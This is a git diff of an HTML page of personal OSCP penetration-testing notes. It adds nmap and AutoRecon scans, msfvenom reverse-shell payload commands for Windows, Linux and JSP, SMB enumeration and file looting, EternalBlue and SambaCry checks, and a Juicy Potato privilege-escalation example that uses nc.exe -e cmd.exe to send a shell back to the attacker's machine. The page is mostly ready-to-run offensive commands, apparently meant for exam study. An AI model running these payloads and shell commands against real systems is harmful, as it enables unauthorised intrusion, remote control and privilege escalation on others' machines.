@@ -3,20 +3,110 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Offsec Notes</title>
+<link rel="stylesheet" href="styles.css">
 </head>
 <body>
 <h1>Offsec Notes - OSCP</h1>
-<p>inital commit</p>
-<p>inital commit</p>
-<p>inital commit</p>
+<p id="info"></p>
+<p id="codebox"></p>
 
-<h2>Initial Scans</h2>
-<p background-color: grey>
-nmap -A -Pn $IP -oN nmap-basicInfoScan.txt<br><br>
+<h1>Initial Scans</h1>
 
-Do a bigger scan looking at all ports and versions<br>
-nmap -v -p- -sT -sV $IP -oN nmap-allPortsScan.txt   <br>
-</p>
+<p id="info">First Scan</p>
+<p id="codebox">nmap -A -Pn $TARGET -oN nmap-basicInfoScan.txt</p>
+
+<p id="info">Scan all ports</p>
+<p id="codebox">nmap -v -p- -sT -sV $TARGET -oN nmap-allPortsScan.txt</p>
+
+<p id="info">Autorecon</p>
+<p id="codebox">python3 /opt/AutoRecon/autorecon.py $TARGET</p>
+
+
+<h1>MSFVenom Reverse Shell Payloads</h1>
+<p id="info">Staged Payloads for Windows - x86</p>
+<p id="codebox">msfvenom -p windows/shell/reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x86.exe</p>
+
+<p id="info">Staged Payloads for Windows - x64</p>
+<p id="codebox">msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x64.exe</p>
+
+<p id="info">Stageless Payloads for Windows - x86</p>
+<p id="codebox">msfvenom -p windows/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x86.exe</p>
+
+<p id="info">Stageless Payloads for Windows - x64</p>
+<p id="codebox">msfvenom -p windows/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x64.exe</p>
+
+<p id="info">Staged Payloads for Linux - x86</p>
+<p id="codebox">msfvenom -p linux/x86/shell/reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f elf > shell-x86.elf</p>
+
+<p id="info">Staged Payloads for Linux - x64</p>
+<p id="codebox">msfvenom -p linux/x64/shell/reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f elf > shell-x64.elf</p>
+
+<p id="info">JSP Payload</p>
+<p id="codebox">msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f raw > shell.jsp</p>
+
+<h1>Ports</h1>
+<h2>SMB - TCP/445</h2>
+<p id="info">List shares</p>
+<p id="codebox">smbclient -L //$TARGET/</p>
+<p id="codebox">smbclient -L //$TARGET/ -p $PORT #Specify non-standard SMB/Samba port</p>
+
+<p id="info">The SMB shares discovered have the following permissions</p>
+<p id="codebox">smbmap -H $TARGET</p>
+<p id="codebox">smbmap -H $TARGET -P $TARGETPORT #Specify non-standard SMB/Samba port</p>
+<p id="codebox">smbget -R smb://$TARGET/$SHARE</p>
+<p id="codebox">smbget -R smb://$TARGET:$TARGETPORT/$SHARE #Specify non-standard SMB/Samba port</p>
+
+<p id="info">Download files</p>
+<p id="codebox">
+    cd loot<br>
+    smbclient \\\\$TARGET\\$SHARE<br>
+    prompt<br>
+    mget *</p>
+
+<p id="info">Check if vulnerable to EternalBlue</p>
+<p id="codebox">sudo nmap $TARGET -p445 --script smb-vuln-ms17-010 -oN scans/$NAME-nmap-scripts-smb-vuln-ms17-010</p>
+
+<p id="info">Check if vulnerable to SambaCry</p>
+<p id="codebox">sudo nmap $TARGET -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-scripts-smb-vuln-cve-2017-7494</p>
+
+
+
+<h2>VNC - TCP/5800 & TCP/5900 </h2>
+
+<p id="info">Check for VNC vulnerabilities</p>
+<p id="codebox">nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900, 5800  $TARGET</p>
+
+<p id="info"></p>
+<p id="codebox"></p>
+
+<p id="info"></p>
+<p id="codebox"></p>
+
+
+<h1>Privilege Escalation</h1>
+<h2>Windows</h2>
+<h3>Juicy Potato - ImpersonatePrivilege and/or SeAssignPrimaryTokenPrivilege enabled</h3>
+<p id="info">Check to see if they are enabled</p>
+<p id="codebox">whoami /priv</p>
+<p id="codebox">whoami /all</p>
+<p id="info">Guides on how to perform the attack</p>
+<p id="codebox"><a href="https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505">Impersonating Privileges with Juicy Potato</a></p>
+<p id="codebox"><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato">HackTricks - JuicyPotato</a></p>
+<p id="info">CLSIDs Lists</p>
+<p id="codebox"><a href="https://ohpe.it/juicy-potato/CLSID/">List of CLSID & script to get CLSID from machine</a></p>
+<p id="codebox"><a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID">List of CLSID & script to get CLSID from machine</a></p>
+<p id="info">Example Usages</p>
+<h4>Victim</h4>
+<p id="codebox">C:\inetpub\wwwroot\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\inetpub\wwwroot\nc.exe -e cmd.exe $KALIIP $KALIPORT" -t * </p>
+<p id="codebox">C:\Microsoft\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\Microsoft\nc.exe -e cmd.exe $KALIIP $KALIPORT" -t *  -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"</p>
+<h4>Kali</h4>
+<p id="codebox">nc -lvnp 1337 $KALIPORT</p>
+
+
+<h3>Windows XP SP0/SP1 Privilege Escalation to System</h3>
+<p id="info">Check OS name and version to see if target is vulnerable</p>
+<p id="codebox">systeminfo</p>
+<p id="codebox"><a href="https://sohvaxus.github.io/content/winxp-sp1-privesc.html">Guide to Exploit</a></p>
 
 <h2>Bypass UAC</h2>
 </body>
